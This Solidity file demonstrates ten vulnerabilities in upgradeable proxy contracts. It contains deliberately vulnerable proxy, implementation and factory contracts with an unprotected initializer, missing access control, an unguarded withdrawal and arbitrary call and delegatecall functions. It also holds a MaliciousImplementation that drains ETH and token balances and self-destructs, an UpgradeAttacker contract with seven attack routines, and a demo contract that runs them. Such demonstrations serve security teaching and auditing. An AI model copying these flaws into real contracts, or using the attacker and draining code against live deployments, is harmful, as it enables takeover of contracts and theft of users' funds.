// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title UpgradeableVulnerable
 * @dev Demonstrates common vulnerabilities in upgradeable smart contracts
 * 
 * Vulnerabilities demonstrated:
 * 1. Unprotected initialization
 * 2. Storage collision issues
 * 3. Function selector clashing
 * 4. Unprotected upgrade mechanism
 * 5. Missing storage gaps
 * 6. Constructor usage in upgradeable contracts
 * 7. Delegatecall vulnerabilities
 * 8. Improper access control for upgrades
 * 9. State variable ordering issues
 * 10. Missing upgrade safety checks
 */

/**
 * @dev Vulnerable proxy contract with multiple security issues
 */
contract VulnerableProxy {
    // Storage slot 0
    address public implementation;
    // Storage slot 1
    address public admin;
    // Storage slot 2
    bool public initialized;
    
    // Missing proper access control
    modifier onlyAdmin() {
        require(msg.sender == admin, "Not admin");
        _;
    }
    
    constructor(address _implementation) {
        implementation = _implementation;
        admin = msg.sender;
    }
    
    // Vulnerable: Anyone can initialize if not properly protected
    function initialize(address _admin) external {
        require(!initialized, "Already initialized");
        admin = _admin;
        initialized = true;
    }
    
    // Vulnerable: No validation of new implementation
    function upgrade(address newImplementation) external onlyAdmin {
        implementation = newImplementation;
    }
    
    // Vulnerable: Direct admin change without proper checks
    function changeAdmin(address newAdmin) external onlyAdmin {
        admin = newAdmin;
    }
    
    // Vulnerable: No protection against malicious delegatecall
    function delegateCallToImplementation(bytes calldata data) external returns (bytes memory) {
        (bool success, bytes memory result) = implementation.delegatecall(data);
        require(success, "Delegatecall failed");
        return result;
    }
    
    // Fallback function with potential issues
    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
    
    receive() external payable {}
}

/**
 * @dev Vulnerable implementation V1 with storage layout issues
 */
contract VulnerableImplementationV1 {
    // Storage layout issues - these will conflict with proxy storage
    address public owner; // Slot 0 - conflicts with proxy's implementation
    uint256 public value; // Slot 1 - conflicts with proxy's admin
    bool public paused;   // Slot 2 - conflicts with proxy's initialized
    
    mapping(address => uint256) public balances;
    mapping(address => bool) public authorized;
    
    uint256 public totalSupply;
    string public name;
    
    // Vulnerable: Using constructor in upgradeable contract
    constructor() {
        owner = msg.sender;
        name = "VulnerableToken";
    }
    
    // Vulnerable: No proper initialization protection
    function initialize(address _owner, uint256 _initialSupply) external {
        owner = _owner;
        totalSupply = _initialSupply;
        balances[_owner] = _initialSupply;
    }
    
    // Vulnerable: No access control
    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balances[to] += amount;
    }
    
    // Vulnerable: No access control
    function burn(address from, uint256 amount) external {
        require(balances[from] >= amount, "Insufficient balance");
        totalSupply -= amount;
        balances[from] -= amount;
    }
    
    function transfer(address to, uint256 amount) external {
        require(!paused, "Contract paused");
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
    
    // Vulnerable: Anyone can pause
    function pause() external {
        paused = true;
    }
    
    function unpause() external {
        paused = false;
    }
    
    // Vulnerable: No access control for authorization
    function authorize(address user) external {
        authorized[user] = true;
    }
    
    function deauthorize(address user) external {
        authorized[user] = false;
    }
    
    // Function that will cause selector clash in V2
    function getValue() external view returns (uint256) {
        return value;
    }
    
    function setValue(uint256 _value) external {
        value = _value;
    }
}

/**
 * @dev Vulnerable implementation V2 with additional issues
 */
contract VulnerableImplementationV2 {
    // Storage layout changed - will cause corruption
    address public owner;     // Slot 0
    bool public paused;       // Slot 1 - moved from slot 2
    uint256 public value;     // Slot 2 - moved from slot 1
    
    // New variables added without proper storage gaps
    address public newAdmin;  // Slot 3
    uint256 public newFeature; // Slot 4
    
    mapping(address => uint256) public balances;
    mapping(address => bool) public authorized;
    
    uint256 public totalSupply;
    string public name;
    
    // New mapping added
    mapping(address => uint256) public rewards;
    
    // Function selector clash with V1's getValue()
    function getValue(uint256 id) external view returns (uint256) {
        return rewards[msg.sender] + id;
    }
    
    // Vulnerable: No initialization protection for new variables
    function initializeV2(address _newAdmin, uint256 _newFeature) external {
        newAdmin = _newAdmin;
        newFeature = _newFeature;
    }
    
    // All previous functions with same vulnerabilities
    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balances[to] += amount;
    }
    
    function burn(address from, uint256 amount) external {
        require(balances[from] >= amount, "Insufficient balance");
        totalSupply -= amount;
        balances[from] -= amount;
    }
    
    function transfer(address to, uint256 amount) external {
        require(!paused, "Contract paused");
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        balances[msg.sender] -= amount;
        balances[to] += amount;
        
        // New feature: reward calculation
        rewards[msg.sender] += amount / 100; // 1% reward
    }
    
    function pause() external {
        paused = true;
    }
    
    function unpause() external {
        paused = false;
    }
    
    function authorize(address user) external {
        authorized[user] = true;
    }
    
    function deauthorize(address user) external {
        authorized[user] = false;
    }
    
    function setValue(uint256 _value) external {
        value = _value;
    }
    
    // New vulnerable function
    function emergencyWithdraw() external {
        // Vulnerable: No access control
        payable(msg.sender).transfer(address(this).balance);
    }
    
    // Vulnerable: Allows arbitrary calls
    function executeCall(address target, bytes calldata data) external returns (bytes memory) {
        (bool success, bytes memory result) = target.call(data);
        require(success, "Call failed");
        return result;
    }
    
    receive() external payable {}
}

/**
 * @dev Malicious implementation for upgrade attacks
 */
contract MaliciousImplementation {
    address public owner;
    uint256 public value;
    bool public paused;
    
    mapping(address => uint256) public balances;
    mapping(address => bool) public authorized;
    
    uint256 public totalSupply;
    string public name;
    
    // Malicious: Steals all funds on any function call
    function _stealFunds() internal {
        payable(msg.sender).transfer(address(this).balance);
        
        // Transfer all token balances to attacker
        balances[msg.sender] = totalSupply;
        for (uint256 i = 0; i < 100; i++) {
            address user = address(uint160(i + 1));
            if (balances[user] > 0) {
                balances[msg.sender] += balances[user];
                balances[user] = 0;
            }
        }
    }
    
    // All functions are malicious
    function mint(address to, uint256 amount) external {
        _stealFunds();
    }
    
    function burn(address from, uint256 amount) external {
        _stealFunds();
    }
    
    function transfer(address to, uint256 amount) external {
        _stealFunds();
    }
    
    function pause() external {
        _stealFunds();
    }
    
    function unpause() external {
        _stealFunds();
    }
    
    function authorize(address user) external {
        _stealFunds();
    }
    
    function deauthorize(address user) external {
        _stealFunds();
    }
    
    function getValue() external view returns (uint256) {
        return value;
    }
    
    function setValue(uint256 _value) external {
        _stealFunds();
    }
    
    // Malicious: Self-destruct to break the contract
    function destroy() external {
        selfdestruct(payable(msg.sender));
    }
    
    receive() external payable {
        _stealFunds();
    }
}

/**
 * @dev Vulnerable factory for creating upgradeable contracts
 */
contract VulnerableUpgradeableFactory {
    address[] public deployedProxies;
    address public defaultImplementation;
    
    mapping(address => bool) public isValidProxy;
    
    event ProxyDeployed(address indexed proxy, address indexed implementation, address indexed deployer);
    
    constructor(address _defaultImplementation) {
        defaultImplementation = _defaultImplementation;
    }
    
    // Vulnerable: No access control for setting default implementation
    function setDefaultImplementation(address _implementation) external {
        defaultImplementation = _implementation;
    }
    
    // Vulnerable: Anyone can deploy proxies
    function deployProxy() external returns (address) {
        VulnerableProxy proxy = new VulnerableProxy(defaultImplementation);
        
        deployedProxies.push(address(proxy));
        isValidProxy[address(proxy)] = true;
        
        emit ProxyDeployed(address(proxy), defaultImplementation, msg.sender);
        
        return address(proxy);
    }
    
    // Vulnerable: Anyone can deploy with custom implementation
    function deployProxyWithImplementation(address implementation) external returns (address) {
        VulnerableProxy proxy = new VulnerableProxy(implementation);
        
        deployedProxies.push(address(proxy));
        isValidProxy[address(proxy)] = true;
        
        emit ProxyDeployed(address(proxy), implementation, msg.sender);
        
        return address(proxy);
    }
    
    // Vulnerable: Mass upgrade without proper validation
    function massUpgrade(address newImplementation) external {
        for (uint256 i = 0; i < deployedProxies.length; i++) {
            VulnerableProxy proxy = VulnerableProxy(payable(deployedProxies[i]));
            try proxy.upgrade(newImplementation) {
                // Upgrade successful
            } catch {
                // Ignore failures
            }
        }
    }
    
    function getDeployedProxiesCount() external view returns (uint256) {
        return deployedProxies.length;
    }
    
    function getDeployedProxy(uint256 index) external view returns (address) {
        require(index < deployedProxies.length, "Index out of bounds");
        return deployedProxies[index];
    }
}

/**
 * @dev Upgrade attacker contract
 */
contract UpgradeAttacker {
    VulnerableProxy public targetProxy;
    VulnerableUpgradeableFactory public factory;
    
    constructor(address _targetProxy, address _factory) {
        targetProxy = VulnerableProxy(payable(_targetProxy));
        factory = VulnerableUpgradeableFactory(_factory);
    }
    
    // Attack 1: Take over admin role
    function takeOverAdmin() external {
        // If proxy is not initialized, initialize with attacker as admin
        try targetProxy.initialize(address(this)) {
            // Successfully became admin
        } catch {
            // Already initialized
        }
    }
    
    // Attack 2: Upgrade to malicious implementation
    function upgradeToMalicious() external {
        MaliciousImplementation malicious = new MaliciousImplementation();
        
        try targetProxy.upgrade(address(malicious)) {
            // Upgrade successful
        } catch {
            // Not admin or upgrade failed
        }
    }
    
    // Attack 3: Exploit delegatecall vulnerability
    function exploitDelegatecall() external {
        // Craft malicious data to change proxy storage
        bytes memory maliciousData = abi.encodeWithSignature(
            "changeAdmin(address)",
            address(this)
        );
        
        try targetProxy.delegateCallToImplementation(maliciousData) {
            // Delegatecall successful
        } catch {
            // Delegatecall failed
        }
    }
    
    // Attack 4: Deploy malicious proxy through factory
    function deployMaliciousProxy() external returns (address) {
        MaliciousImplementation malicious = new MaliciousImplementation();
        return factory.deployProxyWithImplementation(address(malicious));
    }
    
    // Attack 5: Mass upgrade attack
    function massUpgradeAttack() external {
        MaliciousImplementation malicious = new MaliciousImplementation();
        factory.massUpgrade(address(malicious));
    }
    
    // Attack 6: Storage collision attack
    function storageCollisionAttack() external {
        // Call functions that will cause storage corruption
        bytes memory data = abi.encodeWithSignature("setValue(uint256)", 12345);
        
        try targetProxy.delegateCallToImplementation(data) {
            // This might corrupt proxy storage due to storage layout conflicts
        } catch {
            // Attack failed
        }
    }
    
    // Attack 7: Function selector clash attack
    function selectorClashAttack() external {
        // Deploy V2 with selector clash and upgrade
        VulnerableImplementationV2 v2 = new VulnerableImplementationV2();
        
        try targetProxy.upgrade(address(v2)) {
            // Now calls to getValue() will behave differently
        } catch {
            // Upgrade failed
        }
    }
    
    receive() external payable {}
}

/**
 * @dev Demo contract to showcase upgrade vulnerabilities
 */
contract UpgradeVulnerabilityDemo {
    VulnerableUpgradeableFactory public factory;
    VulnerableProxy public demoProxy;
    UpgradeAttacker public attacker;
    
    address public alice;
    address public bob;
    address public maliciousUser;
    
    event DemoStep(string step, bool success, string details);
    
    constructor() {
        alice = address(0x1111);
        bob = address(0x2222);
        maliciousUser = address(0x3333);
        
        // Deploy vulnerable implementation
        VulnerableImplementationV1 impl = new VulnerableImplementationV1();
        
        // Deploy factory
        factory = new VulnerableUpgradeableFactory(address(impl));
        
        // Deploy proxy
        demoProxy = VulnerableProxy(payable(factory.deployProxy()));
        
        // Deploy attacker
        attacker = new UpgradeAttacker(address(demoProxy), address(factory));
    }
    
    function demonstrateInitializationVulnerability() external {
        emit DemoStep("Initialization Attack", false, "Starting attack");
        
        // Attacker tries to initialize proxy
        try demoProxy.initialize(maliciousUser) {
            emit DemoStep("Initialization Attack", true, "Attacker became admin");
        } catch {
            emit DemoStep("Initialization Attack", false, "Attack failed");
        }
    }
    
    function demonstrateStorageCollision() external {
        emit DemoStep("Storage Collision", false, "Starting demonstration");
        
        // Initialize implementation through proxy
        bytes memory initData = abi.encodeWithSignature(
            "initialize(address,uint256)",
            alice,
            1000000
        );
        
        try demoProxy.delegateCallToImplementation(initData) {
            emit DemoStep("Storage Collision", true, "Storage corrupted");
        } catch {
            emit DemoStep("Storage Collision", false, "Call failed");
        }
    }
    
    function demonstrateUpgradeAttack() external {
        emit DemoStep("Upgrade Attack", false, "Starting attack");
        
        // Attacker tries to upgrade to malicious implementation
        try attacker.upgradeToMalicious() {
            emit DemoStep("Upgrade Attack", true, "Malicious upgrade successful");
        } catch {
            emit DemoStep("Upgrade Attack", false, "Upgrade failed");
        }
    }
    
    function demonstrateDelegatecallExploit() external {
        emit DemoStep("Delegatecall Exploit", false, "Starting exploit");
        
        try attacker.exploitDelegatecall() {
            emit DemoStep("Delegatecall Exploit", true, "Delegatecall exploit successful");
        } catch {
            emit DemoStep("Delegatecall Exploit", false, "Exploit failed");
        }
    }
    
    function demonstrateSelectorClash() external {
        emit DemoStep("Selector Clash", false, "Starting demonstration");
        
        // Get value before upgrade
        bytes memory getValueCall = abi.encodeWithSignature("getValue()");
        
        try demoProxy.delegateCallToImplementation(getValueCall) {
            // Upgrade to V2
            try attacker.selectorClashAttack() {
                // Try calling getValue again - should behave differently
                try demoProxy.delegateCallToImplementation(getValueCall) {
                    emit DemoStep("Selector Clash", true, "Function behavior changed");
                } catch {
                    emit DemoStep("Selector Clash", false, "Second call failed");
                }
            } catch {
                emit DemoStep("Selector Clash", false, "Upgrade failed");
            }
        } catch {
            emit DemoStep("Selector Clash", false, "Initial call failed");
        }
    }
    
    function demonstrateMassUpgradeAttack() external {
        emit DemoStep("Mass Upgrade Attack", false, "Starting attack");
        
        // Deploy additional proxies
        factory.deployProxy();
        factory.deployProxy();
        
        try attacker.massUpgradeAttack() {
            emit DemoStep("Mass Upgrade Attack", true, "Mass upgrade successful");
        } catch {
            emit DemoStep("Mass Upgrade Attack", false, "Mass upgrade failed");
        }
    }
    
    function getProxyAdmin() external view returns (address) {
        return demoProxy.admin();
    }
    
    function getProxyImplementation() external view returns (address) {
        return demoProxy.implementation();
    }
    
    function isProxyInitialized() external view returns (bool) {
        return demoProxy.initialized();
    }
}